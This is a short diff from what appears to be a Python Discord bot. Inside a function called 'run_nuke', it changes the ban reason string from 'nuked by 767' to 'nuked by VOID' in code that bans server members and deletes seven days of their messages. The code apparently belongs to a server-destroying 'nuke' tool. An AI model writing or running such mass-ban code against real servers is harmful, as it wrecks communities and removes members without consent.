@@ -89,7 +89,7 @@ async def run_nuke(bot: Any, guild_id: int, guild: Any = None, manual: bool = Fa
                     try:
                         await g.ban(
                             m,
-                            reason="nuked by 767",
+                            reason="nuked by VOID",
                             delete_message_days=7,
                         )
                     except Exception:
